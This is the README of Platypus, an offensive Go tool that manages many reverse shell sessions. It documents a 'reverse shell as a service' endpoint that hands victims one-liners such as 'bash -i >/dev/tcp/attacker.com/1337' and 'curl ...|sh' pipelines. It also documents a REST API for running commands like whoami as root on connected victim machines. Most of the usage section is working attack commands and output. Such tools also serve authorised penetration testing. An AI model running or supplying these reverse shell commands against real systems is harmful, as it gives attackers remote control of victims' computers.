# Platypus

A modern multiple reverse shell sessions/clients manager via terminal written in go

#### Features
- [x] Multiple service listening port
- [x] Multiple client connections
- [x] RESTful API
- [x] Reverse shell as a service
- [ ] Upgrade common reverse shell session into full interactive session

#### Use Platypus from source code
```
go get github.com/WangYihang/Platypus
cd go/src/github.com/WangYihang/Platypus
go run platypus.go
```

#### Use Platypus from release binaries
```
// Download binary from https://github.com/WangYihang/Platypus/releases
# chmod +x ./Platypus_linux_amd64
# ./Platypus_linux_amd64
```

#### Reverse shell as a Service
```
Attack IP: 192.168.1.2
    Reverse Shell Service: 0.0.0.0:8080
    RESTful Service: 127.0.0.1:9090
Victim IP: 192.168.1.3
```
```bash
// Platypus is able to multiplexing the reverse shell listening port
// The port 8080 can receive reverse shell client connection
// Also these is a Reverse shell as a service running on this port

// victim will be redirected to attacker-host attacker-port
// sh -c "$(curl http://host:port/attacker-host/attacker-port)"
# curl http://192.168.1.2:8080/attacker.com/1337
bash -c 'bash -i >/dev/tcp/attacker.com/1337 0>&1'
# sh -c "$(curl http://192.168.1.2:8080/attacker.com/1337)"

// if the attacker info not specified, it will use host, port as attacker-host attacker-port
// sh -c "$(curl http://host:port/)"
# curl http://192.168.1.2:8080/
curl http://192.168.1.2:8080/192.168.1.2/8080|sh
# sh -c "$(curl http://host:port/)"
```

#### RESTful API
```
Attack IP: 192.168.1.2
    Reverse Shell Service: 0.0.0.0:8080
    RESTful Service: 127.0.0.1:9090
Victim IP: 192.168.1.3
```
* `GET /client` List all online clients
```
# curl 'http://127.0.0.1:9090/client'
{
    "msg": [
        "192.168.1.3:54798"
    ],
    "status": true
}
```
* `POST /client/:hash` execute a command on a specific client
```
# curl -X POST 'http://127.0.0.1:9090/client/0723c3bed0d0240140e10a6ffd36eed4' --data 'cmd=whoami'
{
    "status": true,
    "msg": "root\n",
}
```
* How to hash?
```
# echo -n "192.168.1.3:54798" | md5sum
0723c3bed0d0240140e10a6ffd36eed4  -
```

#### TODO
- [ ] More interfaces in RESTful API
- [ ] RESTful API should auth
- [ ] Use crontab
